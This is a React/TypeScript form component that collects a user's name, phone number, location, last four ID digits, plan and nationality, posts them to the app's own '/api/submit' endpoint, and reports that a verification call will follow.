"use client";

import * as React from "react";
import { useState } from "react";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { Button } from "./ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "./ui/form";
import { Input } from "./ui/input";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "./ui/card";
import { formSchema, FormData, ApiResponse } from "../lib/types";

export function VerificationForm() {
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState(false);

  const form = useForm<FormData>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      name: "",
      phoneNumber: "",
      location: "",
      eid: "",
      plan: "",
      nationality: "",
    },
  });

  const onSubmit = async (values: FormData) => {
    try {
      setLoading(true);
      setError(null);
      
      // Send form data to our backend API endpoint
      const response = await fetch('/api/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(values),
      });

      const data = await response.json() as ApiResponse;

      if (!response.ok) {
        throw new Error(data.message || 'Failed to submit form');
      }

      setSuccess(true);
      form.reset();
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Something went wrong. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <Card className="backdrop-blur-md bg-white/90 shadow-xl border-0 rounded-xl overflow-hidden">
      <div className="h-2 bg-gradient-to-r from-slate-600 to-slate-800"></div>
      <CardHeader className="pb-4 pt-6">
        <CardTitle className="text-xl text-slate-800 font-medium">Personal Information</CardTitle>
        <CardDescription className="text-slate-500 text-sm">
          Please fill in the required details
        </CardDescription>
      </CardHeader>
      <CardContent>
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
            <FormField
              control={form.control}
              name="name"
              render={({ field }) => (
                <FormItem>
                  <FormLabel className="text-slate-700 text-sm font-medium">Full Name</FormLabel>
                  <FormControl>
                    <Input 
                      placeholder="Enter your full name" 
                      {...field} 
                      className="h-11 bg-slate-50/50 border-slate-200 rounded-md focus:border-slate-400 focus:ring-slate-300/20 transition-all"
                    />
                  </FormControl>
                  <FormMessage className="text-rose-500 text-xs" />
                </FormItem>
              )}
            />

            <FormField
              control={form.control}
              name="phoneNumber"
              render={({ field }) => (
                <FormItem>
                  <FormLabel className="text-slate-700 text-sm font-medium">Phone Number</FormLabel>
                  <FormControl>
                    <Input 
                      type="tel" 
                      placeholder="Enter your phone number" 
                      {...field} 
                      className="h-11 bg-slate-50/50 border-slate-200 rounded-md focus:border-slate-400 focus:ring-slate-300/20 transition-all"
                    />
                  </FormControl>
                  <FormMessage className="text-rose-500 text-xs" />
                </FormItem>
              )}
            />

            <div className="grid grid-cols-2 gap-4">
              <FormField
                control={form.control}
                name="location"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="text-slate-700 text-sm font-medium">Location</FormLabel>
                    <FormControl>
                      <Input 
                        placeholder="Your location" 
                        {...field} 
                        className="h-11 bg-slate-50/50 border-slate-200 rounded-md focus:border-slate-400 focus:ring-slate-300/20 transition-all"
                      />
                    </FormControl>
                    <FormMessage className="text-rose-500 text-xs" />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="eid"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="text-slate-700 text-sm font-medium">EID</FormLabel>
                    <FormControl>
                      <Input
                        maxLength={4}
                        placeholder="Last 4 digits" 
                        {...field}
                        className="h-11 bg-slate-50/50 border-slate-200 rounded-md focus:border-slate-400 focus:ring-slate-300/20 transition-all"
                      />
                    </FormControl>
                    <FormMessage className="text-rose-500 text-xs" />
                  </FormItem>
                )}
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <FormField
                control={form.control}
                name="plan"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="text-slate-700 text-sm font-medium">Plan</FormLabel>
                    <FormControl>
                      <Input 
                        placeholder="Your plan" 
                        {...field} 
                        className="h-11 bg-slate-50/50 border-slate-200 rounded-md focus:border-slate-400 focus:ring-slate-300/20 transition-all"
                      />
                    </FormControl>
                    <FormMessage className="text-rose-500 text-xs" />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="nationality"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="text-slate-700 text-sm font-medium">Nationality</FormLabel>
                    <FormControl>
                      <Input 
                        placeholder="Your nationality" 
                        {...field} 
                        className="h-11 bg-slate-50/50 border-slate-200 rounded-md focus:border-slate-400 focus:ring-slate-300/20 transition-all"
                      />
                    </FormControl>
                    <FormMessage className="text-rose-500 text-xs" />
                  </FormItem>
                )}
              />
            </div>

            <div className="pt-3">
              <Button
                type="submit"
                className="w-full h-11 bg-gradient-to-r from-slate-700 to-slate-900 hover:from-slate-800 hover:to-slate-950 text-white font-medium rounded-md transition-all shadow-sm"
                disabled={loading}
              >
                {loading ? (
                  <div className="flex items-center justify-center gap-2">
                    <svg className="animate-spin h-4 w-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Submitting & Initiating Call...
                  </div>
                ) : (
                  "Submit Verification"
                )}
              </Button>
            </div>

            {error && (
              <div className="p-4 text-xs bg-rose-50 border border-rose-100 text-rose-700 rounded-lg mt-4 animate-in fade-in duration-300">
                <div className="font-medium text-rose-800 mb-1">Error</div>
                {error}
              </div>
            )}

            {success && (
              <div className="p-4 text-xs bg-emerald-50 border border-emerald-100 text-emerald-700 rounded-lg mt-4 animate-in fade-in duration-300">
                <div className="font-medium text-emerald-800 mb-1">Verification call initiated!</div>
                Your form has been submitted successfully and a verification call will be made to your phone shortly.
              </div>
            )}
          </form>
        </Form>
      </CardContent>
    </Card>
  );
} 